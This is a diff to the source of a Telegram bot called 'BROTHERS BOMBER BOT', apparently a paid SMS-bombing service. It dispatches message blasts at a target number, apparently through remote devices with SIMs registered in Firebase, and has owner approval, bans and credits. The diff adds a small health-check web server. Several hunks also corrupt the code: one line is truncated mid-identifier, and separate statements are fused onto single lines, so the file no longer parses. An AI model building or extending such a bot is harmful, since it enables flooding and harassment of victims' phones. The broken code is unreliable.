@@ -28,6 +28,7 @@ from copy import deepcopy
 from collections import defaultdict
 
 import aiohttp
+from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.types import (
     Message, CallbackQuery,
@@ -53,7 +54,7 @@ BOT_NAME = "BROTHERS BOMBER BOT"
 
 MAIN_OWNER = 5999496406  # Primary Owner / Super Admin
 
-SUPER_ADMINS = [5999496406, 5999496406]  # Hardcoded Super Admins
+SUPER_ADMINS = [5999496406]  # Hardcoded Super Admins
 
 DEVELOPER_USERNAME = "@Brotherssspannel"
 SUPER_ADMIN_NAME = DEVELOPER_USERNAME
@@ -548,8 +549,8 @@ async def get_all_online_devices(d: dict) -> list:
                                         if txt2 == "null" or not txt2:
                                             return None
                                         dev_data = json.loads(txt2)
-                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
-                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
+                                        if isinstance(dev_data, dict) and device_is_online(dev_
+                                                                                           name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                             sims = dev_data.get("sims", [])
                                             return {
                                                 "fb_id": fb["id"],
@@ -1001,8 +1002,7 @@ async def cmd_start(msg: Message, state: FSMContext):
     if is_banned(uid, d):
         await msg.answer("🚫 <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
         return
-    if not can_use(uid, d):
-        await msg.answer(
+    if not can_use(uid, d):await msg.answer(
             f"⛔ <b>Access nahi hai!</b>\n\nOwner se approval lein.\nContact: {SUPER_ADMIN_NAME}",
             parse_mode="HTML"
         )
@@ -1505,8 +1505,7 @@ async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: 
             "message": message[:100],
             "timestamp": int(time.time()),
             "status": "completed" if not was_cancelled else "stopped"
-        })
-        save(d_final)
+        })save(d_final)
     else:
         d_final = load()
         d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
@@ -2020,8 +2019,7 @@ async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
         f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
         reply_markup=fb_menu_kb(d),
         parse_mode="HTML"
-    )
-
+        )
 @R.callback_query(F.data == "owner:fb:add")
 async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2524,8 +2522,7 @@ async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
         full,
         reply_markup=kb([("🔄 Refresh", "admin:stats"), ("🔙 Back", "admin:home")]),
         parse_mode="HTML"
-    )
-
+)
 # ========== FORCE JOIN ==========
 @R.callback_query(F.data == "owner:fj:menu")
 async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
@@ -2999,7 +2996,6 @@ async def owner_credits_add_amount(msg: Message, state: FSMContext):
     except:
         await msg.answer("❌ Valid number bhejo.")
         return
-
     fsmd = await state.get_data()
     uid = fsmd.get("credit_uid")
     add_credits(uid, amount, d)
@@ -3365,7 +3361,23 @@ async def user_info(cq: CallbackQuery, state: FSMContext):
 async def noop(cq: CallbackQuery):
     await cq.answer()
 
+async def _render_health_server():
+    """Minimal HTTP server so Render Web Service can detect a listening port."""
+    port = int(os.getenv("PORT", "10000"))
+    async def health(request):
+        return web.Response(text="OK")
+    app = web.Application()
+    app.router.add_get("/", health)
+    app.router.add_get("/health", health)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    log.info(f"🌐 Render health server listening on port {port}")
+    return runner
+
 async def main():
+    health_runner = await _render_health_server()
     bot = Bot(token=BOT_TOKEN)
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(R)
